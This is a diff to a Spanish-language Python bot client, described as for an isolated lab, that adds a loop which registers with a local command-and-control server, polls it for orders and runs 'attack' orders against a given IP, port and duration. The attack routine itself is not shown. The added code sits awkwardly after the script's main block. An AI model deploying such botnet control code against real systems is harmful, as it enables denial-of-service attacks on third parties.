@@ -11,6 +11,8 @@ Uso solo en un laboratorio aislado y controlado.
 import socket
 import time
 
+from victima import PUERTO
+
 # Puerto donde escuchamos las ordenes del C&C (debe coincidir con cc.py)
 PUERTO_CC = 5000
 
@@ -56,3 +58,30 @@ def escuchar():
 
 if __name__ == "__main__":
     escuchar()
+
+import time, requests
+
+CC = "http://localhost:8000"
+BOT_ID = "bot1"
+
+# registro al arrancar
+requests.post(f"{CC}/registro", json={"id": BOT_ID})
+
+def ejecutar(orden):
+    tipo = orden.get("tipo") #"ataque"
+    params = orden.get("parametros", {})     # {"ip": "x", "puerto": ..., "duracion": 2000}
+    ip = params.get("ip")
+    puerto = params.get("puerto")
+    duracion = params.get("duracion")
+    # aquí se decide qué se hace en cada tipo de orden
+    if tipo == "ataque":
+        atacar(ip, puerto, duracion)
+    # elif tipo == "...":
+    #     ...
+
+while True:
+    r = requests.get(f"{CC}/ordenes/{BOT_ID}")
+    orden = r.json().get("orden")
+    if orden:
+        ejecutar(orden)
+    time.sleep(5)
